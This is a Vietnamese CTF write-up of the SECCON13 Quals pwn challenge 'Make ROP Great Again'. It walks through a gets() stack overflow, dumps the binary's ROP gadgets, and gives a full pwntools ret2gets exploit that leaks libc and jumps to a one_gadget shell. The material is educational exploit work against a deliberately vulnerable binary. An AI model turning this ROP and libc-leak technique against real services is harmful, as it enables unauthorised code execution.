---
title: Make ROP Great Again
date: 2025-02-20 00:00:00 +0800
categories: [pwn]
tags: [rop]
author: "kuvee"
layout: post
---

- 1 bài về ROP nâng cao khá hay ở SECCON13 Quals

## overview

checksec: 

```cs
ploi@PhuocLoiiiii:~/pwn/ROP/make-rop-great-again/make-rop-great-again$ checksec chall
[*] '/home/ploi/pwn/ROP/make-rop-great-again/make-rop-great-again/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- đây là hàm main của bài , ta có thể thấy được 1 bug ```BOF``` rất dễ dàng và canary cũng không được bật ở đây

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[16]; // [rsp+0h] [rbp-10h] BYREF

  show_prompt(argc, argv, envp);
  gets(v4);
  return 0;
}
```
- show_prompt 

```C
int show_prompt()
{
  return puts(">");
}
```

- ta có thể dùng ```ropper``` để check các gadget tuy nhiên sẽ không có ```pop rdi,rsi,rdx``` gì vì file được biên dịch ở 1 libc cao và nó sẽ không còn ```libc_csu_init``` nữa

```cs
ploi@PhuocLoiiiii:~/pwn/ROP/make-rop-great-again/make-rop-great-again$ ropper -f chall_patched
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%



Gadgets
=======


0x00000000004010ac: adc dword ptr [rax], eax; call qword ptr [rip + 0x2f3b]; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x000000000040111e: adc dword ptr [rax], edi; test rax, rax; je 0x3130; mov edi, 0x404010; jmp rax;
0x00000000004010b0: adc eax, 0x2f3b; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x00000000004010dc: adc edi, dword ptr [rax]; test rax, rax; je 0x30f0; mov edi, 0x404010; jmp rax;
0x000000000040114c: adc edx, dword ptr [rbp + 0x48]; mov ebp, esp; call 0x30d0; mov byte ptr [rip + 0x2ecb], 1; pop rbp; ret;
0x00000000004010b4: add ah, dh; nop word ptr cs:[rax + rax]; endbr64; ret;
0x00000000004010ae: add bh, bh; adc eax, 0x2f3b; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x000000000040100e: add byte ptr [rax - 0x7b], cl; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret;
0x00000000004011c6: add byte ptr [rax], al; add byte ptr [rax], al; call 0x3080; mov eax, 0; leave; ret;
0x00000000004011a7: add byte ptr [rax], al; add byte ptr [rax], al; pop rbp; ret;
0x00000000004010de: add byte ptr [rax], al; add byte ptr [rax], al; test rax, rax; je 0x30f0; mov edi, 0x404010; jmp rax;
0x0000000000401120: add byte ptr [rax], al; add byte ptr [rax], al; test rax, rax; je 0x3130; mov edi, 0x404010; jmp rax;
0x00000000004010bc: add byte ptr [rax], al; add byte ptr [rax], al; endbr64; ret;
0x00000000004011d0: add byte ptr [rax], al; add byte ptr [rax], al; leave; ret;
0x0000000000401056: add byte ptr [rax], al; add cl, ch; ret 0xffff;
0x00000000004011d1: add byte ptr [rax], al; add cl, cl; ret;
0x00000000004011c8: add byte ptr [rax], al; call 0x3080; mov eax, 0; leave; ret;
0x000000000040119c: add byte ptr [rax], al; mov rdi, rax; call 0x3070; mov eax, 0; pop rbp; ret;
0x00000000004011a9: add byte ptr [rax], al; pop rbp; ret;
0x000000000040100d: add byte ptr [rax], al; test rax, rax; je 0x3016; call rax;
0x000000000040100d: add byte ptr [rax], al; test rax, rax; je 0x3016; call rax; add rsp, 8; ret;
0x00000000004010e0: add byte ptr [rax], al; test rax, rax; je 0x30f0; mov edi, 0x404010; jmp rax;
0x0000000000401122: add byte ptr [rax], al; test rax, rax; je 0x3130; mov edi, 0x404010; jmp rax;
0x00000000004010be: add byte ptr [rax], al; endbr64; ret;
0x00000000004010b3: add byte ptr [rax], al; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x00000000004011d2: add byte ptr [rax], al; leave; ret;
0x000000000040115b: add byte ptr [rcx], al; pop rbp; ret;
0x0000000000401058: add cl, ch; ret 0xffff;
0x00000000004011d3: add cl, cl; ret;
0x00000000004010ad: add dil, dil; adc eax, 0x2f3b; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x000000000040100a: add eax, 0x2fe9; test rax, rax; je 0x3016; call rax;
0x000000000040100a: add eax, 0x2fe9; test rax, rax; je 0x3016; call rax; add rsp, 8; ret;
0x0000000000401017: add esp, 8; ret;
0x0000000000401016: add rsp, 8; ret;
0x00000000004011e0: and byte ptr [rax], al; call 0x3060; nop; pop rbp; ret;
0x00000000004011e3: call 0x3060; nop; pop rbp; ret;
0x00000000004011a1: call 0x3070; mov eax, 0; pop rbp; ret;
0x00000000004011ca: call 0x3080; mov eax, 0; leave; ret;
0x0000000000401151: call 0x30d0; mov byte ptr [rip + 0x2ecb], 1; pop rbp; ret;
0x00000000004010af: call qword ptr [rip + 0x2f3b]; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x0000000000401014: call rax;
0x0000000000401014: call rax; add rsp, 8; ret;
0x00000000004010b1: cmp ebp, dword ptr [rdi]; add byte ptr [rax], al; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x0000000000401006: in al, dx; or byte ptr [rax - 0x75], cl; add eax, 0x2fe9; test rax, rax; je 0x3016; call rax;
0x0000000000401012: je 0x3016; call rax;
0x0000000000401012: je 0x3016; call rax; add rsp, 8; ret;
0x00000000004010db: je 0x30f0; mov eax, 0; test rax, rax; je 0x30f0; mov edi, 0x404010; jmp rax;
0x00000000004010e5: je 0x30f0; mov edi, 0x404010; jmp rax;
0x000000000040111d: je 0x3130; mov eax, 0; test rax, rax; je 0x3130; mov edi, 0x404010; jmp rax;
0x0000000000401127: je 0x3130; mov edi, 0x404010; jmp rax;
0x000000000040103d: jmp qword ptr [rsi - 0x70];
0x00000000004010ec: jmp rax;
0x0000000000401156: mov byte ptr [rip + 0x2ecb], 1; pop rbp; ret;
0x00000000004011c5: mov eax, 0; call 0x3080; mov eax, 0; leave; ret;
0x00000000004011a6: mov eax, 0; pop rbp; ret;
0x00000000004010dd: mov eax, 0; test rax, rax; je 0x30f0; mov edi, 0x404010; jmp rax;
0x000000000040111f: mov eax, 0; test rax, rax; je 0x3130; mov edi, 0x404010; jmp rax;
0x00000000004011cf: mov eax, 0; leave; ret;
0x0000000000401009: mov eax, dword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax;
0x0000000000401009: mov eax, dword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax; add rsp, 8; ret;
0x000000000040114f: mov ebp, esp; call 0x30d0; mov byte ptr [rip + 0x2ecb], 1; pop rbp; ret;
0x00000000004011dc: mov ebp, esp; mov edi, 0x402004; call 0x3060; nop; pop rbp; ret;
0x00000000004011de: mov edi, 0x402004; call 0x3060; nop; pop rbp; ret;
0x00000000004010e7: mov edi, 0x404010; jmp rax;
0x000000000040119f: mov edi, eax; call 0x3070; mov eax, 0; pop rbp; ret;
0x00000000004011c3: mov edi, eax; mov eax, 0; call 0x3080; mov eax, 0; leave; ret;
0x0000000000401008: mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax;
0x0000000000401008: mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax; add rsp, 8; ret;
0x000000000040114e: mov rbp, rsp; call 0x30d0; mov byte ptr [rip + 0x2ecb], 1; pop rbp; ret;
0x00000000004011db: mov rbp, rsp; mov edi, 0x402004; call 0x3060; nop; pop rbp; ret;
0x000000000040119e: mov rdi, rax; call 0x3070; mov eax, 0; pop rbp; ret;
0x00000000004011c2: mov rdi, rax; mov eax, 0; call 0x3080; mov eax, 0; leave; ret;
0x00000000004010b8: nop dword ptr [rax + rax]; endbr64; ret;
0x00000000004010b7: nop dword ptr cs:[rax + rax]; endbr64; ret;
0x00000000004010b6: nop word ptr cs:[rax + rax]; endbr64; ret;
0x0000000000401007: or byte ptr [rax - 0x75], cl; add eax, 0x2fe9; test rax, rax; je 0x3016; call rax;
0x00000000004010e6: or dword ptr [rdi + 0x404010], edi; jmp rax;
0x000000000040115d: pop rbp; ret;
0x000000000040114d: push rbp; mov rbp, rsp; call 0x30d0; mov byte ptr [rip + 0x2ecb], 1; pop rbp; ret;
0x000000000040105a: ret 0xffff;
0x0000000000401011: sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret;
0x00000000004011f1: sub esp, 8; add rsp, 8; ret;
0x0000000000401005: sub esp, 8; mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax;
0x00000000004011f0: sub rsp, 8; add rsp, 8; ret;
0x0000000000401004: sub rsp, 8; mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax;
0x00000000004010ba: test byte ptr [rax], al; add byte ptr [rax], al; add byte ptr [rax], al; endbr64; ret;
0x0000000000401010: test eax, eax; je 0x3016; call rax;
0x0000000000401010: test eax, eax; je 0x3016; call rax; add rsp, 8; ret;
0x00000000004010e3: test eax, eax; je 0x30f0; mov edi, 0x404010; jmp rax;
0x0000000000401125: test eax, eax; je 0x3130; mov edi, 0x404010; jmp rax;
0x000000000040100f: test rax, rax; je 0x3016; call rax;
0x000000000040100f: test rax, rax; je 0x3016; call rax; add rsp, 8; ret;
0x00000000004010e2: test rax, rax; je 0x30f0; mov edi, 0x404010; jmp rax;
0x0000000000401124: test rax, rax; je 0x3130; mov edi, 0x404010; jmp rax;
0x00000000004011ef: cli; sub rsp, 8; add rsp, 8; ret;
0x0000000000401003: cli; sub rsp, 8; mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax;
0x00000000004010c3: cli; ret;
0x00000000004011ec: endbr64; sub rsp, 8; add rsp, 8; ret;
0x0000000000401000: endbr64; sub rsp, 8; mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax;
0x00000000004010c0: endbr64; ret;
0x00000000004010b5: hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x00000000004011d4: leave; ret;
0x00000000004011e8: nop; pop rbp; ret;
0x00000000004010ef: nop; ret;
0x000000000040101a: ret;

105 gadgets found
```

- sẽ có rất nhiều cách để làm bài này , ta có thể pivot hoặc tìm được các gadget và kết nối chúng với nhau(đây là 1 quá trình cần sự trãi nghiệm và kiên trì :v) , ta cũng có thể sử dụng ```ret2gets``` 

đây là exp cho ret2gets: 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()

payload = b'a'*16
payload += p64(0)
payload += p64(exe.plt.gets)
payload += p64(exe.plt.gets)
payload += p64(exe.plt.puts)
payload += p64(exe.sym.main)

input()
p.sendlineafter(b'>',payload)
input()
p.sendline(p32(0) + b"A"*4 + b"B"*8)
input()
p.sendline(b"CCCC")

p.recv(8)
p.recv(8)
libc.address = u64(p.recv(6).ljust(8,b'\x00')) + 0x28c0
log.info(f'libc: {hex(libc.address)}')
og = libc.address + 0xef4ce # rbx r12  rbp-0x48 NULL

pl = b'a'*16
pl += p64(0x405000-0x50)
pl += p64(0x00000000000586d4+libc.address) + p64(0)#pop rbx
pl += p64(0x0000000000110951+libc.address) + p64(0)
pl += p64(og)
p.sendline(pl)



p.interactive()
```